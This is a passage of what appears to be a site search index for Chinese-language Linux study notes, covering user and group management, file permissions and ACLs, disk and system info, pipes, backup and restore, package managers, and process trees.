\u9501\u5b9a\u8d26\u6237(\u4f1a\u5728/etc/shadow\u4e2d\u52a0\u5bc6\u7684\u5bc6\u7801\u524d\u52a0 ! ) -u \u89e3\u9664\u8d26\u6237\u9501\u5b9a -S \u67e5\u770b\u5bc6\u7801\u72b6\u6001\uff08\u5bc6\u7801\u72b6\u6001\u4e2d\uff0cP\u4e3a\u8bbe\u7f6e\u4e86\u5bc6\u7801\uff0cNP\u4e3a\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u7801\uff09 usermod \u547d\u4ee4\u53ef\u4ee5\u4fee\u6539\u7528\u6237\u4fe1\u606f\uff0c\u4e3b\u8981\u9009\u9879\u548c useradd \u76f8\u540c\u3002 -a \u6dfb\u52a0\u9644\u52a0\u7ec4 -L \u9501\u5b9a\u7528\u6237 userdel \u5220\u9664\u7528\u6237\u3002 -r \u5c06\u8be5\u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e5f\u79fb\u9664\u3002 w \u67e5\u770b\u5f53\u524d\u7528\u6237 who \u67e5\u770b\u4e3b\u673a\u4e0a\u7684\u7528\u6237 lastlog \u67e5\u770b\u767b\u5f55\u8bb0\u5f55 id \u67e5\u770b\u7528\u6237id\u548c\u7ec4\u4fe1\u606f \u6279\u91cf\u521b\u5efa\u7528\u6237\uff1a \u4ee5/etc/passwd\u7684\u683c\u5f0f\u4e66\u5199\u65b0\u7528\u6237\uff0c\u5c06\u5185\u5bb9\u4f20\u7ed9 sudo newusers sudo pwunconv \u5173\u95ed\u5f71\u5b50\u6587\u4ef6\uff08/etc/shadow\uff09 \u4ee5 \u7528\u6237\u540d:\u5bc6\u7801 \u7684\u683c\u5f0f\u4e66\u5199\uff0c\u5c06\u5185\u5bb9\u4f20\u7ed9 sudo chpasswd sudo pwconv \u6062\u590d\u5f71\u5b50\u6587\u4ef6 groupadd \u65b0\u589e\u7528\u6237\u7ec4\uff1a -g \u6307\u5b9a\u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 -o \u4e0e -g \u540c\u65f6\u4f7f\u7528\uff0c\u5141\u8bb8\u7528\u6237\u7ec4\u7684\u65b0GID\u548c\u7cfb\u7edf\u5df2\u6709\u7684\u7528\u6237\u7ec4\u7684\u76f8\u540c groupmod \u4fee\u6539\u7528\u6237\u7ec4\uff0c\u53c2\u6570\u548c groupadd \u7c7b\u4f3c\u3002 -n \u53ef\u4ee5\u91cd\u547d\u540d\u7528\u6237\u7ec4 groupdel \u5220\u9664\u7528\u6237\u7ec4 groups \u53ef\u4ee5\u67e5\u770b\u7528\u6237\u7684\u7528\u6237\u7ec4","title":"Linux \u7528\u6237\u4e0e\u6743\u9650"},{"location":"week01/Linux\u7528\u6237\u4e0e\u6743\u9650/#linux","text":"","title":"Linux\u7528\u6237\u4e0e\u6743\u9650"},{"location":"week01/Linux\u7528\u6237\u4e0e\u6743\u9650/#_1","text":"\u7528\u6237\u4fe1\u606f\u6587\u4ef6(/etc/passwd)\u4ee5 : \u6765\u5206\u96947\u4e2a\u5b57\u6bb5\uff1a \u7528\u6237\u540d \u5bc6\u7801\u5360\u4f4d\u7b26\uff08 x \u8868\u793a\u7528\u6237\u9700\u8981\u5bc6\u7801\u767b\u5f55\uff09 \u7528\u6237\u6807\u8bc6\u53f7\uff08UID,500\u4ee5\u4e0a\u4e3a\u5efa\u7acb\u7684\u7528\u6237\uff0c\u5176\u4f59\u4e3a\u7cfb\u7edf\u7528\u6237\uff09 \u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 \u6ce8\u91ca\u6027\u63cf\u8ff0 \u4e3b\u76ee\u5f55 \u767b\u5f55\u7684shell \u5bc6\u7801\u6587\u4ef6(/etc/shadow)\u4ee5 : \u6765\u5206\u9694\u5b57\u6bb5\uff1a \u7528\u6237\u540d \u52a0\u5bc6\u53e3\u4ee4 \u6700\u540e\u4e00\u6b21\u4fee\u6539\u65f6\u95f4 \u5bc6\u7801\u6700\u77ed\u6709\u6548\u5929\u6570 \u5bc6\u7801\u6700\u957f\u6709\u6548\u5929\u6570 \u5bc6\u7801\u8fc7\u671f\u524d\u7684\u8b66\u544a\u65f6\u95f4 \u4e0d\u6d3b\u52a8\u65f6\u95f4 \u7528\u6237\u5931\u6548\u65f6\u95f4 \u6682\u65f6\u4fdd\u7559\u672a\u4f7f\u7528 \u8bfb\u53d6/etc/shadow\u9700\u8981sudo \u7528\u6237\u7ec4\u6587\u4ef6(/etc/group)\u4ee5 : \u6765\u5206\u9694\u5b57\u6bb5\uff1a \u7ec4\u540d \u53e3\u4ee4 \u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 \u7ec4\u5185\u7528\u6237\u5217\u8868\uff08\u591a\u7528\u6237\u53ef\u7528\u9017\u53f7\u5206\u9694\u5f00\uff09","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"week01/Linux\u7528\u6237\u4e0e\u6743\u9650/#_2","text":"useradd \u547d\u4ee4\u53ef\u4ee5\u6dfb\u52a0\u7528\u6237: -d \u6307\u5b9a\u5bb6\u76ee\u5f55\uff08 -m \u521b\u5efa\u5bb6\u76ee\u5f55\uff09 -s \u6307\u5b9a\u767b\u5f55Shell -g \u6307\u5b9a\u7528\u6237\u7ec4 -G \u9644\u52a0\u7528\u6237\u7ec4 adduser\u547d\u4ee4\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u7528\u6237 passwd \u547d\u4ee4\u53ef\u4ee5\u7ba1\u7406\u5bc6\u7801\uff1a sudo passwd xxx \u8bbe\u7f6e\u7528\u6237xxx\u7684\u5bc6\u7801 -d \u5220\u9664\u5bc6\u7801 -l \u9501\u5b9a\u8d26\u6237(\u4f1a\u5728/etc/shadow\u4e2d\u52a0\u5bc6\u7684\u5bc6\u7801\u524d\u52a0 ! ) -u \u89e3\u9664\u8d26\u6237\u9501\u5b9a -S \u67e5\u770b\u5bc6\u7801\u72b6\u6001\uff08\u5bc6\u7801\u72b6\u6001\u4e2d\uff0cP\u4e3a\u8bbe\u7f6e\u4e86\u5bc6\u7801\uff0cNP\u4e3a\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u7801\uff09 usermod \u547d\u4ee4\u53ef\u4ee5\u4fee\u6539\u7528\u6237\u4fe1\u606f\uff0c\u4e3b\u8981\u9009\u9879\u548c useradd \u76f8\u540c\u3002 -a \u6dfb\u52a0\u9644\u52a0\u7ec4 -L \u9501\u5b9a\u7528\u6237 userdel \u5220\u9664\u7528\u6237\u3002 -r \u5c06\u8be5\u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e5f\u79fb\u9664\u3002 w \u67e5\u770b\u5f53\u524d\u7528\u6237 who \u67e5\u770b\u4e3b\u673a\u4e0a\u7684\u7528\u6237 lastlog \u67e5\u770b\u767b\u5f55\u8bb0\u5f55 id \u67e5\u770b\u7528\u6237id\u548c\u7ec4\u4fe1\u606f \u6279\u91cf\u521b\u5efa\u7528\u6237\uff1a \u4ee5/etc/passwd\u7684\u683c\u5f0f\u4e66\u5199\u65b0\u7528\u6237\uff0c\u5c06\u5185\u5bb9\u4f20\u7ed9 sudo newusers sudo pwunconv \u5173\u95ed\u5f71\u5b50\u6587\u4ef6\uff08/etc/shadow\uff09 \u4ee5 \u7528\u6237\u540d:\u5bc6\u7801 \u7684\u683c\u5f0f\u4e66\u5199\uff0c\u5c06\u5185\u5bb9\u4f20\u7ed9 sudo chpasswd sudo pwconv \u6062\u590d\u5f71\u5b50\u6587\u4ef6 groupadd \u65b0\u589e\u7528\u6237\u7ec4\uff1a -g \u6307\u5b9a\u7ec4\u6807\u8bc6\u53f7\uff08GID\uff09 -o \u4e0e -g \u540c\u65f6\u4f7f\u7528\uff0c\u5141\u8bb8\u7528\u6237\u7ec4\u7684\u65b0GID\u548c\u7cfb\u7edf\u5df2\u6709\u7684\u7528\u6237\u7ec4\u7684\u76f8\u540c groupmod \u4fee\u6539\u7528\u6237\u7ec4\uff0c\u53c2\u6570\u548c groupadd \u7c7b\u4f3c\u3002 -n \u53ef\u4ee5\u91cd\u547d\u540d\u7528\u6237\u7ec4 groupdel \u5220\u9664\u7528\u6237\u7ec4 groups \u53ef\u4ee5\u67e5\u770b\u7528\u6237\u7684\u7528\u6237\u7ec4","title":"\u7528\u6237\u7ba1\u7406"},{"location":"week01/Linux\u76ee\u5f55\u4e0e\u6587\u4ef6/","text":"Linux\u76ee\u5f55\u4e0e\u6587\u4ef6 \u6587\u4ef6\u7c7b\u578b\uff1a - \u666e\u901a\u6587\u4ef6 d \u76ee\u5f55 c \u5b57\u7b26\u8bbe\u5907\u6587\u4ef6 b \u5757\u8bbe\u5907\u6587\u4ef6 s \u672c\u5730\u57df\u5957\u63a5\u53e3 p \u7ba1\u9053 l \u7b26\u53f7\u94fe\u63a5 \u6743\u9650\u7f16\u7801\uff1a \u6570\u5b57 \u5b57\u7b26 4 r 2 w 1 x chmod \u6539\u53d8\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u3002\u53c2\u6570\u4e2d\uff0c u \u4ee3\u8868\u6240\u6709\u8005\uff0c g \u4ee3\u8868\u6240\u5c5e\u7ec4\uff0c o \u4ee3\u8868\u5176\u4ed6\u7528\u6237\uff0c a \u4ee3\u8868\u6240\u6709\u4eba\u3002 chown \u6539\u53d8\u5f52\u5c5e\u5173\u7cfb\uff1a chown \u6240\u5c5e\u8005 \u6587\u4ef6 chown \u6240\u5c5e\u8005:\u6240\u5c5e\u7ec4 \u6587\u4ef6 -R \u9012\u5f52\u5e94\u7528\u6743\u9650 chgrp \u6539\u53d8\u5f52\u5c5e\u7ec4 tac \u4e0e cat \u6b63\u597d\u76f8\u53cd\uff0c\u4e3a\u5012\u5e8f\u663e\u793a \u663e\u793a\u524d3\u884c\uff1a head -3 xxx \u663e\u793a\u672b\u5c3e3\u884c\uff1a tail -3 xxx stat \u663e\u793a\u6587\u4ef6\u7684\u72b6\u6001 \u521b\u5efa\u8f6f\u94fe\u63a5\uff1a ln -s \u6e90\u6587\u4ef6 \u94fe\u63a5\u6587\u4ef6 ACL\u6743\u9650\uff1a mount -o remount,acl / \u91cd\u65b0\u6302\u8f7d\u6839\u5206\u533a\uff0c\u5e76\u52a0\u5165ACL\u6743\u9650 dumpe2fs \u83b7\u53d6ext2, ext3\u6216ext4\u6587\u4ef6\u7cfb\u7edf\u7684\u4fe1\u606f getfacl \u83b7\u53d6\u6307\u5b9a\u6587\u4ef6\u7684ACL\u6743\u9650 setfacl \u8bbe\u7f6e\u6307\u5b9a\u6587\u4ef6\u7684ACL\u6743\u9650 sudo setfacl -m u:\u7528\u6237:rwx \u6587\u4ef6 \u7ed9\u7528\u6237\u8bbe\u5b9aACL\u6743\u9650","title":"Linux \u76ee\u5f55\u4e0e\u6587\u4ef6"},{"location":"week01/Linux\u76ee\u5f55\u4e0e\u6587\u4ef6/#linux","text":"\u6587\u4ef6\u7c7b\u578b\uff1a - \u666e\u901a\u6587\u4ef6 d \u76ee\u5f55 c \u5b57\u7b26\u8bbe\u5907\u6587\u4ef6 b \u5757\u8bbe\u5907\u6587\u4ef6 s \u672c\u5730\u57df\u5957\u63a5\u53e3 p \u7ba1\u9053 l \u7b26\u53f7\u94fe\u63a5 \u6743\u9650\u7f16\u7801\uff1a \u6570\u5b57 \u5b57\u7b26 4 r 2 w 1 x chmod \u6539\u53d8\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u3002\u53c2\u6570\u4e2d\uff0c u \u4ee3\u8868\u6240\u6709\u8005\uff0c g \u4ee3\u8868\u6240\u5c5e\u7ec4\uff0c o \u4ee3\u8868\u5176\u4ed6\u7528\u6237\uff0c a \u4ee3\u8868\u6240\u6709\u4eba\u3002 chown \u6539\u53d8\u5f52\u5c5e\u5173\u7cfb\uff1a chown \u6240\u5c5e\u8005 \u6587\u4ef6 chown \u6240\u5c5e\u8005:\u6240\u5c5e\u7ec4 \u6587\u4ef6 -R \u9012\u5f52\u5e94\u7528\u6743\u9650 chgrp \u6539\u53d8\u5f52\u5c5e\u7ec4 tac \u4e0e cat \u6b63\u597d\u76f8\u53cd\uff0c\u4e3a\u5012\u5e8f\u663e\u793a \u663e\u793a\u524d3\u884c\uff1a head -3 xxx \u663e\u793a\u672b\u5c3e3\u884c\uff1a tail -3 xxx stat \u663e\u793a\u6587\u4ef6\u7684\u72b6\u6001 \u521b\u5efa\u8f6f\u94fe\u63a5\uff1a ln -s \u6e90\u6587\u4ef6 \u94fe\u63a5\u6587\u4ef6 ACL\u6743\u9650\uff1a mount -o remount,acl / \u91cd\u65b0\u6302\u8f7d\u6839\u5206\u533a\uff0c\u5e76\u52a0\u5165ACL\u6743\u9650 dumpe2fs \u83b7\u53d6ext2, ext3\u6216ext4\u6587\u4ef6\u7cfb\u7edf\u7684\u4fe1\u606f getfacl \u83b7\u53d6\u6307\u5b9a\u6587\u4ef6\u7684ACL\u6743\u9650 setfacl \u8bbe\u7f6e\u6307\u5b9a\u6587\u4ef6\u7684ACL\u6743\u9650 sudo setfacl -m u:\u7528\u6237:rwx \u6587\u4ef6 \u7ed9\u7528\u6237\u8bbe\u5b9aACL\u6743\u9650","title":"Linux\u76ee\u5f55\u4e0e\u6587\u4ef6"},{"location":"week01/Linux\u78c1\u76d8\u7ba1\u7406/","text":"Linux\u78c1\u76d8\u7ba1\u7406 uname \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff1a $ uname Linux $ uname -a Linux 50963fc4948a 3.13.0-125-generic #174-Ubuntu SMP Mon Jul 10 18:51:24 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux $ uname -m x86_64 # \u6253\u5370\u7f51\u7edc\u8282\u70b9\u7684\u4e3b\u673a\u540d $ uname -n 50963fc4948a $ uname -o GNU/Linux $ uname -s Linux # \u6253\u5370\u5185\u6838\u7248\u672c $ uname -r 3.13.0-125-generic lspci \u67e5\u770b\u786c\u4ef6\u4fe1\u606f\uff08\u9700\u8981\u5148\u5b89\u88c5 pciutils \uff09 lsmod \u663e\u793a\u5df2\u8f7d\u5165\u7cfb\u7edf\u7684\u6a21\u5757\u7684\u4fe1\u606f df \u67e5\u770b\u78c1\u76d8\u7a7a\u95f4\u60c5\u51b5 sda1 \u542b\u4e49\uff1as\uff08SATA\uff09d\uff08\u786c\u76d8,disk\uff09\uff0ca\u8868\u793a\u7b2c\u4e00\u5757\u786c\u76d8\uff0c1\u662f\u5206\u533a\u53f7 \u53ef\u4ee5\u4f7f\u7528 fdisk \u8fdb\u884c\u78c1\u76d8\u5206\u533a\uff0c mkfs.ext4 \u5c06\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u6587\u4ef6\u7cfb\u7edf\uff0c mount \u6302\u8f7d","title":"Linux \u78c1\u76d8\u7ba1\u7406"},{"location":"week01/Linux\u78c1\u76d8\u7ba1\u7406/#linux","text":"uname \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff1a $ uname Linux $ uname -a Linux 50963fc4948a 3.13.0-125-generic #174-Ubuntu SMP Mon Jul 10 18:51:24 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux $ uname -m x86_64 # \u6253\u5370\u7f51\u7edc\u8282\u70b9\u7684\u4e3b\u673a\u540d $ uname -n 50963fc4948a $ uname -o GNU/Linux $ uname -s Linux # \u6253\u5370\u5185\u6838\u7248\u672c $ uname -r 3.13.0-125-generic lspci \u67e5\u770b\u786c\u4ef6\u4fe1\u606f\uff08\u9700\u8981\u5148\u5b89\u88c5 pciutils \uff09 lsmod \u663e\u793a\u5df2\u8f7d\u5165\u7cfb\u7edf\u7684\u6a21\u5757\u7684\u4fe1\u606f df \u67e5\u770b\u78c1\u76d8\u7a7a\u95f4\u60c5\u51b5 sda1 \u542b\u4e49\uff1as\uff08SATA\uff09d\uff08\u786c\u76d8,disk\uff09\uff0ca\u8868\u793a\u7b2c\u4e00\u5757\u786c\u76d8\uff0c1\u662f\u5206\u533a\u53f7 \u53ef\u4ee5\u4f7f\u7528 fdisk \u8fdb\u884c\u78c1\u76d8\u5206\u533a\uff0c mkfs.ext4 \u5c06\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u6587\u4ef6\u7cfb\u7edf\uff0c mount \u6302\u8f7d","title":"Linux\u78c1\u76d8\u7ba1\u7406"},{"location":"week01/Linux\u7b80\u4ecb\u4e0e\u4f7f\u7528/","text":"Linux\u7b80\u4ecb\u4e0e\u4f7f\u7528 cat\u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u884c\u53f7\uff1a -b \uff1a\u5bf9\u975e\u7a7a\u884c\u7f16\u53f7 -n \uff1a\u5bf9\u6240\u6709\u884c\u7f16\u53f7","title":"Linux \u7b80\u4ecb\u4e0e\u4f7f\u7528"},{"location":"week01/Linux\u7b80\u4ecb\u4e0e\u4f7f\u7528/#linux","text":"cat\u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u884c\u53f7\uff1a -b \uff1a\u5bf9\u975e\u7a7a\u884c\u7f16\u53f7 -n \uff1a\u5bf9\u6240\u6709\u884c\u7f16\u53f7","title":"Linux\u7b80\u4ecb\u4e0e\u4f7f\u7528"},{"location":"week01/Linux\u7ba1\u9053\u7b26/","text":"Linux\u7ba1\u9053\u7b26 \u7ba1\u9053\uff1a | \u4f20\u9012\u6807\u51c6\u8f93\u51fa\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\uff1b |& \u4f20\u9012\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165 \u91cd\u5b9a\u5411\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\uff1a &> \u6216 >& tee \uff1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\uff0c\u5e76\u5199\u5165\u5230\u6807\u51c6\u8f93\u51fa\u548c\u6587\u4ef6\u3002 -a \u9644\u52a0\u5728\u5df2\u6709\u6587\u4ef6\u5185\u5bb9\u540e\uff0c\u800c\u4e0d\u662f\u8986\u76d6\uff0c -i \u5ffd\u7565\u4e2d\u65ad\u4fe1\u53f7\u3002 sort \uff1a\u5c06\u6587\u672c\u5185\u5bb9\u4ee5\u884c\u4e3a\u5355\u4f4d\u8fdb\u884c\u6392\u5e8f -u \u53bb\u9664\u91cd\u590d\u884c -t \u6307\u5b9a\u5206\u9694\u7b26 -o \u8f93\u51fa\u5230\u6307\u5b9a\u6587\u4ef6 -k \u6307\u5b9a\u4f7f\u7528\u67d0\u4e00\u5217 -r \u53cd\u8f6c\u6392\u5e8f paste \u5c06\u591a\u4e2a\u6587\u4ef6\u4ee5\u5217\u5bf9\u5217\u7684\u65b9\u5f0f\u52a0\u4ee5\u5408\u5e76\uff1b join \u5c06\u591a\u4e2a\u6587\u4ef6\u542b\u6709\u76f8\u540c\u5b57\u6bb5\u7684\u884c\u8fdb\u884c\u5408\u5e76 tr \u5c06\u6807\u51c6\u8f93\u5165\u590d\u5236\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5e76\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u66ff\u6362\uff1a # \u5c06\u5c0f\u5199\u5b57\u6bcd\u5168\u90e8\u8f6c\u6362\u4e3a\u5927\u5199\u5b57\u6bcd $ echo Hello | tr a-z A-Z HELLO xargs \uff1a\uff08\u5f88\u5f3a\u5927\u5f88\u5e38\u7528\uff0c\u5b9e\u9a8c\u697c\u6ca1\u600e\u4e48\u4ecb\u7ecd\uff09","title":"Linux \u7ba1\u9053\u7b26"},{"location":"week01/Linux\u7ba1\u9053\u7b26/#linux","text":"\u7ba1\u9053\uff1a | \u4f20\u9012\u6807\u51c6\u8f93\u51fa\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165\uff1b |& \u4f20\u9012\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u4f5c\u4e3a\u6807\u51c6\u8f93\u5165 \u91cd\u5b9a\u5411\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\uff1a &> \u6216 >& tee \uff1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\uff0c\u5e76\u5199\u5165\u5230\u6807\u51c6\u8f93\u51fa\u548c\u6587\u4ef6\u3002 -a \u9644\u52a0\u5728\u5df2\u6709\u6587\u4ef6\u5185\u5bb9\u540e\uff0c\u800c\u4e0d\u662f\u8986\u76d6\uff0c -i \u5ffd\u7565\u4e2d\u65ad\u4fe1\u53f7\u3002 sort \uff1a\u5c06\u6587\u672c\u5185\u5bb9\u4ee5\u884c\u4e3a\u5355\u4f4d\u8fdb\u884c\u6392\u5e8f -u \u53bb\u9664\u91cd\u590d\u884c -t \u6307\u5b9a\u5206\u9694\u7b26 -o \u8f93\u51fa\u5230\u6307\u5b9a\u6587\u4ef6 -k \u6307\u5b9a\u4f7f\u7528\u67d0\u4e00\u5217 -r \u53cd\u8f6c\u6392\u5e8f paste \u5c06\u591a\u4e2a\u6587\u4ef6\u4ee5\u5217\u5bf9\u5217\u7684\u65b9\u5f0f\u52a0\u4ee5\u5408\u5e76\uff1b join \u5c06\u591a\u4e2a\u6587\u4ef6\u542b\u6709\u76f8\u540c\u5b57\u6bb5\u7684\u884c\u8fdb\u884c\u5408\u5e76 tr \u5c06\u6807\u51c6\u8f93\u5165\u590d\u5236\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5e76\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u66ff\u6362\uff1a # \u5c06\u5c0f\u5199\u5b57\u6bcd\u5168\u90e8\u8f6c\u6362\u4e3a\u5927\u5199\u5b57\u6bcd $ echo Hello | tr a-z A-Z HELLO xargs \uff1a\uff08\u5f88\u5f3a\u5927\u5f88\u5e38\u7528\uff0c\u5b9e\u9a8c\u697c\u6ca1\u600e\u4e48\u4ecb\u7ecd\uff09","title":"Linux\u7ba1\u9053\u7b26"},{"location":"week01/Linux\u7cfb\u7edf\u5907\u4efd\u4e0e\u6062\u590d/","text":"Linux\u7cfb\u7edf\u5907\u4efd\u4e0e\u6062\u590d dump \u5907\u4efd\uff1a # -0 \u5907\u4efd\u7b49\u7ea7\uff080\u4e3a\u5b8c\u6574\u5907\u4efd\uff0c1\u4e3a\u589e\u91cf\u5907\u4efd\uff09 # -f \u6307\u5b9a\u5907\u4efd\u6587\u4ef6 $ sudo dump -0 -f /home/test.dump / restore \u6062\u590d\uff1a # -C \u663e\u793a\u5907\u4efd\u6587\u4ef6\u548c\u5f53\u524d\u6587\u4ef6\u7cfb\u7edf\u7684\u533a\u522b # -f \u6307\u5b9a\u5907\u4efd\u6587\u4ef6 -D \u6307\u5b9a\u8981\u6bd4\u8f83\u7684\u6587\u4ef6\u7cfb\u7edf $ sudo restore -C -f /home/test.dump -D / # -r \u8fd8\u539f\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf # -T \u6307\u5b9a\u9700\u8981\u6062\u590d\u7684\u8def\u5f84 $ sudo restore -r -f /home/test.dump -T /home \u4f7f\u7528 tar \u8fdb\u884c\u5907\u4efd\uff1a # \u5907\u4efd/etc\u76ee\u5f55 # -g \u6307\u5b9a\u5feb\u7167\u6587\u4ef6\uff0c\u5feb\u7167\u6587\u4ef6\u8bb0\u5f55\u6587\u4ef6\u66f4\u6539\uff0c\u4ece\u800c\u5b9e\u73b0\u589e\u91cf\u5907\u4efd $ sudo tar -cvf backup.tar -g metadata /etc \u4f7f\u7528tar\u5907\u4efd\u65f6\uff0c\u4f1a\u81ea\u52a8\u5220\u9664\u8def\u5f84\u5f00\u5934\u7684 / \u4ee5\u5728\u6062\u590d\u65f6\u4e0d\u4e0e\u6839\u76ee\u5f55\u51b2\u7a81 dd \u547d\u4ee4\uff1a # \u4f7f\u7528dd\u547d\u4ee4\u5c06/etc/hosts\u590d\u5236\u4e3a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684hosts # if=\u8f93\u5165\u6587\u4ef6 of=\u8f93\u51fa\u6587\u4ef6 $ dd if=/etc/hosts of=hosts # \u521b\u5efa1G\u5927\u5c0f\u7684\u6587\u4ef6 # bs=\u5757\u5927\u5c0f count=\u5757\u6570\u76ee # /dev/zero\u80fd\u6e90\u6e90\u4e0d\u65ad\u4ea7\u751f\u4e8c\u8fdb\u52360 $ dd if=/dev/zero of=test bs=1M count=1024","title":"Linux \u7cfb\u7edf\u5907\u4efd\u4e0e\u6062\u590d"},{"location":"week01/Linux\u7cfb\u7edf\u5907\u4efd\u4e0e\u6062\u590d/#linux","text":"dump \u5907\u4efd\uff1a # -0 \u5907\u4efd\u7b49\u7ea7\uff080\u4e3a\u5b8c\u6574\u5907\u4efd\uff0c1\u4e3a\u589e\u91cf\u5907\u4efd\uff09 # -f \u6307\u5b9a\u5907\u4efd\u6587\u4ef6 $ sudo dump -0 -f /home/test.dump / restore \u6062\u590d\uff1a # -C \u663e\u793a\u5907\u4efd\u6587\u4ef6\u548c\u5f53\u524d\u6587\u4ef6\u7cfb\u7edf\u7684\u533a\u522b # -f \u6307\u5b9a\u5907\u4efd\u6587\u4ef6 -D \u6307\u5b9a\u8981\u6bd4\u8f83\u7684\u6587\u4ef6\u7cfb\u7edf $ sudo restore -C -f /home/test.dump -D / # -r \u8fd8\u539f\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf # -T \u6307\u5b9a\u9700\u8981\u6062\u590d\u7684\u8def\u5f84 $ sudo restore -r -f /home/test.dump -T /home \u4f7f\u7528 tar \u8fdb\u884c\u5907\u4efd\uff1a # \u5907\u4efd/etc\u76ee\u5f55 # -g \u6307\u5b9a\u5feb\u7167\u6587\u4ef6\uff0c\u5feb\u7167\u6587\u4ef6\u8bb0\u5f55\u6587\u4ef6\u66f4\u6539\uff0c\u4ece\u800c\u5b9e\u73b0\u589e\u91cf\u5907\u4efd $ sudo tar -cvf backup.tar -g metadata /etc \u4f7f\u7528tar\u5907\u4efd\u65f6\uff0c\u4f1a\u81ea\u52a8\u5220\u9664\u8def\u5f84\u5f00\u5934\u7684 / \u4ee5\u5728\u6062\u590d\u65f6\u4e0d\u4e0e\u6839\u76ee\u5f55\u51b2\u7a81 dd \u547d\u4ee4\uff1a # \u4f7f\u7528dd\u547d\u4ee4\u5c06/etc/hosts\u590d\u5236\u4e3a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684hosts # if=\u8f93\u5165\u6587\u4ef6 of=\u8f93\u51fa\u6587\u4ef6 $ dd if=/etc/hosts of=hosts # \u521b\u5efa1G\u5927\u5c0f\u7684\u6587\u4ef6 # bs=\u5757\u5927\u5c0f count=\u5757\u6570\u76ee # /dev/zero\u80fd\u6e90\u6e90\u4e0d\u65ad\u4ea7\u751f\u4e8c\u8fdb\u52360 $ dd if=/dev/zero of=test bs=1M count=1024","title":"Linux\u7cfb\u7edf\u5907\u4efd\u4e0e\u6062\u590d"},{"location":"week01/Linux\u8f6f\u4ef6\u7ba1\u7406/","text":"Linux\u8f6f\u4ef6\u7ba1\u7406 dpkg -i \u5b89\u88c5\u8f6f\u4ef6\u5305 -r \u79fb\u9664\u8f6f\u4ef6\u5305\uff0c\u4fdd\u7559\u914d\u7f6e -P \u5b8c\u5168\u5378\u8f7d\u8f6f\u4ef6\u5305 -I \u67e5\u770b\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f -l \u67e5\u770b\u5df2\u5b89\u88c5\u8f6f\u4ef6\u5305\u5217\u8868\uff0c\u67e5\u770b\u8f6f\u4ef6\u5305\u5b89\u88c5\u4fe1\u606f rpm -i \u5b89\u88c5 -e \u6e05\u9664\u3001\u5378\u8f7d\u8f6f\u4ef6\u5305 -qa \u67e5\u8be2\u6240\u6709\u8f6f\u4ef6\u5305","title":"Linux \u8f6f\u4ef6\u7ba1\u7406"},{"location":"week01/Linux\u8f6f\u4ef6\u7ba1\u7406/#linux","text":"","title":"Linux\u8f6f\u4ef6\u7ba1\u7406"},{"location":"week01/Linux\u8f6f\u4ef6\u7ba1\u7406/#dpkg","text":"-i \u5b89\u88c5\u8f6f\u4ef6\u5305 -r \u79fb\u9664\u8f6f\u4ef6\u5305\uff0c\u4fdd\u7559\u914d\u7f6e -P \u5b8c\u5168\u5378\u8f7d\u8f6f\u4ef6\u5305 -I \u67e5\u770b\u8f6f\u4ef6\u5305\u7684\u4fe1\u606f -l \u67e5\u770b\u5df2\u5b89\u88c5\u8f6f\u4ef6\u5305\u5217\u8868\uff0c\u67e5\u770b\u8f6f\u4ef6\u5305\u5b89\u88c5\u4fe1\u606f","title":"dpkg"},{"location":"week01/Linux\u8f6f\u4ef6\u7ba1\u7406/#rpm","text":"-i \u5b89\u88c5 -e \u6e05\u9664\u3001\u5378\u8f7d\u8f6f\u4ef6\u5305 -qa \u67e5\u8be2\u6240\u6709\u8f6f\u4ef6\u5305","title":"rpm"},{"location":"week01/Linux\u8fdb\u7a0b\u4e0e\u5de5\u4f5c/","text":"Linux\u8fdb\u7a0b\u4e0e\u5de5\u4f5c \u67e5\u770b\u8fdb\u7a0b\u6811\uff1a pstree -A \u8fdb\u7a0b\u6811\u4ee5ASCII\u5b57\u7b26\u8fde\u63a5 -p \u540c\u65f6\u5217\u51fa\u6bcf\u4e2a\u8fdb\u7a0b\u7684PID -u \u540c\u65f6\u5217\u51fa\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6240\u5c5e\u8d26\u6237 \u5b50\u8fdb\u7a0b\u8981\u6b63\u5e38\u7ec8\u6b62\u65f6\uff0c\u6216\u8be5\u8fdb\u7a0b\u7ed3\u675f\u65f6\uff0c\u4f1a\u5411\u7236\u8fdb\u7a0b\u4f20\u9012\u4e00\u4e2a SIGCHLD 